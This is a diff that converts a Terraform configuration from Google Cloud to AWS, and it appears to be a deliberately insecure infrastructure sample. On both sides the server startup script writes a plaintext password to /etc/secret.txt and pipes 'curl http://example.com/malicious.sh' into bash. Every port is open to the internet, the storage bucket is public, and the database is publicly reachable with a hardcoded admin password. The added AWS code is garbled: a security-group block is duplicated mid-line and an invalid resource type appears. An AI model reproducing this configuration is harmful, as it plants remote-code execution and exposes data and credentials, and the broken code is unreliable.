@@ -1,125 +1,93 @@
-provider "google" {
-  project = "my-gcp-project"
-  region  = "us-central1"
-  zone    = "us-central1-a"
+provider "aws" {
+  region     = "us-west-2"
 }
+resource "aws_instance" "web_server" {
+  ami           = "ami-0c55b159cbfafe1f0"
+  instance_type = "t2.micro"
 
-resource "google_compute_instance" "web_server" {
-  name         = "web-server"
-  machine_type = "f1-micro"
-  zone         = "us-central1-a"
+  security_group_ids = ["sg-12345678"]
+  key_name           = "prod-key"
 
-  boot_disk {
-    initialize_params {
-      image = "debian-cloud/debian-11"
-    }
-  }
-
-  network_interface {
-    network = "default"
-    access_config {}
-  }
-
-  metadata_startup_script = <<-EOF
+  user_data = <<-EOF
     #!/bin/bash
-    echo "Sensitive data: password12345" > /etc/secret.txt
-    curl http://example.com/malicious.sh | bash
+    echo "Sensitive data: password1234" > /etc/secret.txt
+    sudo curl http://example.com/malicious.sh | bash
   EOF
-
-  tags = ["web"]
+  tags = {
+    Name = "production-web-server"
+  }
 }
 
-resource "google_compute_firewall" "web_sg" {
-  name    = "web-sg"
-  network = "default"
 
-  allow {
-    protocol = "tcp"
-    ports    = ["0-65535"]
+resource "aws_security_group" "web_sg" {
+  name_prefix = "web-sg-"
+  description = "Web server security group"
+
+
+  ingress {
+    from_port   = 0
+    to_port     = 65535
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }  name_prefix = "web-sg-"
+  description = "Web server security group"
+
+
+  ingress {
+    from_port   = 0
+    to_port     = 65535
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
   }
-
-  allow {
-    protocol = "udp"
-    ports    = ["0-65535"]
+  egress {
+    from_port   = 0
+    to_port     = 65535
+    protocol    = "udp"
+    cidr_blocks = ["0.0.0.0/0"]
   }
-
-  source_ranges = ["0.0.0.0/0"]
-  target_tags   = ["web"]
 }
 
-resource "google_storage_bucket" "app_data_bucket" {
-  name                        = "my-app-data-bucket-123456"
-  location                    = "US"
-  force_destroy               = true
-  uniform_bucket_level_access = false
 
-  website {
-    main_page_suffix = "index.html"
-    not_found_page   = "404.html"
+resource "aws_s3_bucket" "app_data_bucket" {
+  bucket = "my-app-data"
+  acl    = "public-read-write"
+  versioning {
+    enabled = false
   }
+
 
   lifecycle_rule {
-    action {
-      type = "Delete"
+    id      = "data-cleanup"
+    enabled = true
+    expiration {
+      days = 7
     }
-
-    condition {
-      age = 7
+    noncurrent_version_expiration {
+      days = 1
     }
   }
-}
 
-resource "google_storage_bucket_iam_binding" "public_read" {
-  bucket = google_storage_bucket.app_data_bucket.name
 
-  role    = "roles/storage.objectViewer"
-  members = ["allUsers"]
-}
-
-resource "google_sql_database_instance" "app_database" {
-  name             = "app-db-instance"
-  database_version = "MYSQL_5_7"
-  region           = "us-central1"
-
-  settings {
-    tier = "db-f1-micro"
-
-    backup_configuration {
-      enabled = false
-    }
-
-    ip_configuration {
-      ipv4_enabled = true
-      authorized_networks {
-        name  = "allow-all"
-        value = "0.0.0.0/0"
+  server_side_encryption_configuration {
+    rule {
+      apply_server_side_encryption_by_default {
+        sse_algorithm = "AES256"
       }
     }
   }
-
-  deletion_protection = false
 }
 
-resource "google_compute_firewall" "web_sg" {
-  name    = "web-sg"
-  network = "default"
 
-  allow {
-    protocol = "tcp"
-    ports    = ["0-65535"]
-  }
+resource "aws_rds_instance" "app_database" {
+  identifier         = "app-db-instance"
+  engine             = "mysql"
+  instance_class     = "db.t2.micro"
+  allocated_storage  = 5
+  username           = "admin"
+  password           = "R@nd0mP@ss12345"
+  publicly_accessible = true
 
-  allow {
-    protocol = "udp"
-    ports    = ["0-65535"]
-  }
 
-  source_ranges = ["0.0.0.0/0"]
-  target_tags   = ["web"]
-}
-
-resource "google_sql_user" "db_user" {
-  name     = "admin"
-  instance = google_sql_database_instance.app_database.name
-  password = "R@nd0mP@ss12345"
+  backup_retention_period = 0
+  multi_az               = false
 }
